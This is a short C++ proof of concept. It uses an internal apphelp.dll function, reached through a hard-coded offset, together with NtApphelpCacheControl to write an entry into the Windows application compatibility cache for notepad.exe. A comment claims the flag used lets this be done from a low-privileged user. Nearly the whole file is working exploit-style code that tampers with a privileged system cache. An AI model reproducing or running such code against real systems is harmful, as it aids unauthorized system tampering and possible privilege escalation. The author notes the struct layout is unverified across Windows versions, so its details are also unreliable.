#include <windows.h>
#include <winternl.h>
#include <cstdio>
#include <cstring>

typedef NTSTATUS(NTAPI* NtApphelpCacheControl)(ULONG, PVOID);
typedef LONG(WINAPI* AppHelpInit)(PVOID, const WCHAR*, PVOID);

//No idea if this is correct across Windows versions and I'm too lazy to spin up 8 VMs to figure that out..
#pragma pack(push, 1)
struct AHC_UPDATE_STRUCT 
{
    BYTE pad0[0x50];
    DWORD flags;
    BYTE pad1[0x14];
    PVOID cacheKey;
    BYTE pathUStr[16];
    PVOID pData;
    DWORD dataSize;
    BYTE pad2[0xEC];
};
#pragma pack(pop)

int main() 
{
    HMODULE appHelp = LoadLibraryW(L"apphelp.dll");
    if (!appHelp)
    {
        printf("Failed to load apphelp.dll\n");
        getchar();
        return 1;
    }
    auto init = (AppHelpInit)((uintptr_t)appHelp + 0xf214); //You can get the offset for it via opening apphelp.dll in IDA, rebasing to 0x0 then jumping to COMPAT_CACHE_AUTO_EXE::Init (make sure you loaded PDBs)
    auto cacheControl = (NtApphelpCacheControl)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtApphelpCacheControl");
    if (!cacheControl)
    {
        printf("Failed to get NtApphelpCacheControl address\n");
        getchar();
        return 1;
    }
    BYTE cacheObj[0x30] = {};
    LONG hr = init(cacheObj, L"C:\\Windows\\System32\\notepad.exe", nullptr);
    if (hr < 0)
    {
        printf("Initialization failed, error code: %08X\n", hr);
        getchar();
        return 1;
    }
    HANDLE file = *(HANDLE*)(&cacheObj[0x00]);
    DWORD flagsValue = 0x5C0;
    AHC_UPDATE_STRUCT s = {};
    s.flags = 0x5C0; //This flag allows it to be done from a low-priv user
    s.cacheKey = file;
    memcpy(s.pathUStr, &cacheObj[0x18], 16);
    s.pData = &flagsValue;
    s.dataSize = sizeof(DWORD);
    NTSTATUS status = cacheControl(2, &s);
    if (NT_SUCCESS(status))
    {
        printf("Worked, no error\n");
    }
    else
    {
        printf("Failed, error code: %08X\n", (UINT)status);
    }
    printf("Press any key to exit");
    getchar();
    return 0;
}
